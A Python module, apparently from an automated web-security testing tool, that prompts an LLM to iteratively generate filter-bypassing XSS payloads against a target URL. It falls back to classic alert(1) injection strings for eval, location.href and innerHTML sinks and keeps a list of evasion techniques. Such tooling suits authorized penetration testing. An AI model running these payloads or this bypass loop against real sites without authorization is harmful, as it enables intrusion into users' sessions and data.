"""
Strategic Payload Generator

Generates intelligent XSS payloads based on history, analysis, and detected patterns.
"""

from typing import List, Dict, Any, Optional
import logging
import json

from .config import AnalysisConfig
from .memory import GlobalMemoryManager


class StrategicPayloadGenerator:
    """
    Generates XSS payloads strategically based on accumulated knowledge.

    Uses:
    - Global history (what failed/succeeded)
    - Latest analysis results
    - Detected protections
    - Pattern recognition
    """

    def __init__(
        self,
        llm_client,
        memory_manager: GlobalMemoryManager,
        config: Optional[AnalysisConfig] = None
    ):
        """
        Initialize payload generator.

        Args:
            llm_client: LLM client for generation
            memory_manager: Global memory manager
            config: Configuration object
        """
        self.llm = llm_client
        self.memory = memory_manager
        self.config = config or AnalysisConfig.default()
        self.logger = logging.getLogger(self.__class__.__name__)

    async def generate_next_payload(
        self,
        target_url: str,
        detected_sinks: List[Dict],
        parameters: List[str],
        latest_strategy: Optional[Dict] = None
    ) -> Dict[str, Any]:
        """
        Generate the next strategic payload.

        Args:
            target_url: Target URL
            detected_sinks: List of detected sinks
            parameters: Discovered parameters
            latest_strategy: Latest bypass strategy from analysis (if any)

        Returns:
            Dict with payload, reasoning, confidence, etc.
        """
        attempt_number = len(self.memory.history) + 1
        self.logger.info(f"Generating payload #{attempt_number}")

        # Get context from memory
        recent_context = self.memory.get_recent_context(count=10)
        recent_failures = self.memory.get_recent_failures(count=5)
        avg_confidence = self.memory.get_average_confidence()

        # Build generation prompt
        prompt = self._build_generation_prompt(
            target_url=target_url,
            attempt_number=attempt_number,
            detected_sinks=detected_sinks,
            parameters=parameters,
            recent_context=recent_context,
            recent_failures=recent_failures,
            latest_strategy=latest_strategy,
            avg_confidence=avg_confidence
        )

        try:
            # simple_chat is synchronous, not async
            response = self.llm.simple_chat(
                model="claude-4-sonnet",
                message=prompt,
                temperature=self.config.generation_temperature
            )

            # Parse response
            data = self._parse_generation_response(response)

            # Validate and enhance
            data['attempt_number'] = attempt_number
            data['generated_at'] = 'timestamp'

            # Check if we've tried this before
            if self.memory.has_tried_payload(data['payload']):
                self.logger.warning(f"Payload already tried, requesting alternative")
                return await self._generate_alternative(data, recent_context)

            self.logger.info(f"Generated payload: {data['payload'][:50]}... (confidence: {data.get('confidence', 0)}%)")
            return data

        except Exception as e:
            self.logger.error(f"Payload generation failed: {e}, using fallback")
            return self._fallback_generation(attempt_number, detected_sinks, parameters)

    def _build_generation_prompt(
        self,
        target_url: str,
        attempt_number: int,
        detected_sinks: List[Dict],
        parameters: List[str],
        recent_context: List[str],
        recent_failures: List[str],
        latest_strategy: Optional[Dict],
        avg_confidence: int
    ) -> str:
        """Build LLM prompt for payload generation"""

        # Format sinks
        sinks_str = json.dumps(detected_sinks, indent=2) if detected_sinks else "None detected"

        # Format parameters
        params_str = ", ".join(parameters) if parameters else "None discovered"

        # Format strategy
        strategy_str = ""
        if latest_strategy:
            strategy_str = f"""
LATEST BYPASS STRATEGY (from deep analysis):
- Technique: {latest_strategy.get('bypass_technique', 'N/A')}
- Category: {latest_strategy.get('bypass_category', 'N/A')}
- Reasoning: {latest_strategy.get('reasoning', 'N/A')}
- Confidence: {latest_strategy.get('confidence', 0)}%
- Template: {latest_strategy.get('payload_template', 'N/A')}
"""

        return f"""
Generate the NEXT strategic XSS payload for testing.

TARGET: {target_url}
ATTEMPT: #{attempt_number}

DETECTED SINKS:
{sinks_str}

PARAMETERS:
{params_str}

{strategy_str}

RECENT ATTEMPTS (last 10):
{chr(10).join(f"{i+1}. {ctx[:150]}" for i, ctx in enumerate(recent_context))}

RECENT FAILURES (patterns to avoid):
{chr(10).join(f"- {fail[:150]}" for fail in recent_failures)}

AVERAGE CONFIDENCE SO FAR: {avg_confidence}%

INSTRUCTIONS:
1. Analyze what protections are in place based on recent attempts
2. Generate ONE payload that:
   - Avoids patterns that previously failed
   - Uses insights from latest strategy (if provided)
   - Targets detected sinks appropriately
   - Uses discovered parameters
   - Has NOT been tried before
3. Be creative and strategic

Respond ONLY with JSON:
{{
  "payload": "the exact payload string",
  "target_sink": "innerHTML|eval|location.href|etc",
  "target_parameter": "param_name or null",
  "test_method": "query_param|hash|post_data",
  "bypass_technique": "what technique this uses",
  "reasoning": "why this should work based on analysis",
  "avoids": ["blocked_pattern1", "blocked_pattern2"],
  "confidence": 0-100,
  "alternatives": ["alt_payload1", "alt_payload2"]
}}
"""

    def _parse_generation_response(self, response: str) -> Dict[str, Any]:
        """Parse LLM generation response"""
        import re

        # Extract JSON
        if '{' in response:
            json_start = response.find('{')

            # Find matching closing brace
            brace_count = 0
            in_string = False
            escape_next = False

            for i in range(json_start, len(response)):
                char = response[i]

                if escape_next:
                    escape_next = False
                    continue

                if char == '\\':
                    escape_next = True
                    continue

                if char == '"' and not escape_next:
                    in_string = not in_string
                    continue

                if not in_string:
                    if char == '{':
                        brace_count += 1
                    elif char == '}':
                        brace_count -= 1
                        if brace_count == 0:
                            json_str = response[json_start:i+1]
                            return json.loads(json_str)

        raise ValueError(f"Could not extract JSON from response: {response[:200]}")

    async def _generate_alternative(
        self,
        original: Dict[str, Any],
        recent_context: List[str]
    ) -> Dict[str, Any]:
        """Generate alternative when original was already tried"""

        prompt = f"""
The payload "{original['payload']}" was already tried. Generate an alternative.

ORIGINAL:
{json.dumps(original, indent=2)}

RECENT HISTORY:
{chr(10).join(recent_context[-5:])}

Generate a DIFFERENT payload using the same technique but different implementation.

Respond ONLY with JSON (same format as before).
"""

        # simple_chat is synchronous, not async
        response = self.llm.simple_chat(
            model="claude-4-sonnet",
            message=prompt,
            temperature=self.config.generation_temperature + 0.1  # Slightly higher for variety
        )

        return self._parse_generation_response(response)

    def _fallback_generation(
        self,
        attempt_number: int,
        detected_sinks: List[Dict],
        parameters: List[str]
    ) -> Dict[str, Any]:
        """Fallback payload generation without LLM"""

        # Use simple template-based generation
        param = parameters[0] if parameters else 'q'
        sink_types = [s.get('sink_type', 'innerHTML') for s in detected_sinks]

        # Choose payload based on sink
        if 'eval' in sink_types or 'Function' in sink_types:
            payload = '\');alert(1);//'
            sink = 'eval'
        elif 'location.href' in sink_types:
            payload = 'javascript:alert(1)'
            sink = 'location.href'
        else:
            payload = '<img src=x onerror=alert(1)>'
            sink = 'innerHTML'

        return {
            'payload': payload,
            'target_sink': sink,
            'target_parameter': param,
            'test_method': 'query_param',
            'bypass_technique': 'fallback_template',
            'reasoning': 'LLM generation failed, using template',
            'avoids': [],
            'confidence': 40,
            'alternatives': [],
            'attempt_number': attempt_number
        }

    async def generate_batch(
        self,
        count: int,
        target_url: str,
        detected_sinks: List[Dict],
        parameters: List[str]
    ) -> List[Dict[str, Any]]:
        """
        Generate multiple payloads at once.

        Args:
            count: Number of payloads to generate
            target_url: Target URL
            detected_sinks: Detected sinks
            parameters: Parameters

        Returns:
            List of payload dicts
        """
        self.logger.info(f"Generating batch of {count} payloads")

        payloads = []
        for i in range(count):
            try:
                payload = await self.generate_next_payload(
                    target_url, detected_sinks, parameters
                )
                payloads.append(payload)

                # Add to memory as "planned" so we don't regenerate
                self.memory.history.append(
                    self.memory.MemoryEntry(
                        attempt_number=len(self.memory.history) + 1,
                        payload=payload['payload'],
                        summary=f"Planned: {payload['bypass_technique']}",
                        confidence=payload.get('confidence', 50),
                        success=False
                    )
                )

            except Exception as e:
                self.logger.error(f"Failed to generate payload {i+1}: {e}")

        return payloads

    def get_untried_techniques(self) -> List[str]:
        """Get bypass techniques we haven't tried yet"""
        # All possible techniques
        all_techniques = [
            'polyglot', 'event_handler', 'alternative_function',
            'unicode_encoding', 'hex_encoding', 'base64_encoding',
            'string_concatenation', 'template_literal', 'tag_breaking',
            'protocol_handler', 'data_uri', 'mxss', 'context_breaking',
            'comment_insertion', 'case_variation', 'null_byte'
        ]

        # Techniques we've tried
        tried = set()
        for entry in self.memory.history:
            if 'technique' in entry.summary.lower():
                # Extract technique name from summary
                for tech in all_techniques:
                    if tech.replace('_', ' ') in entry.summary.lower():
                        tried.add(tech)

        # Return untried
        return [t for t in all_techniques if t not in tried]
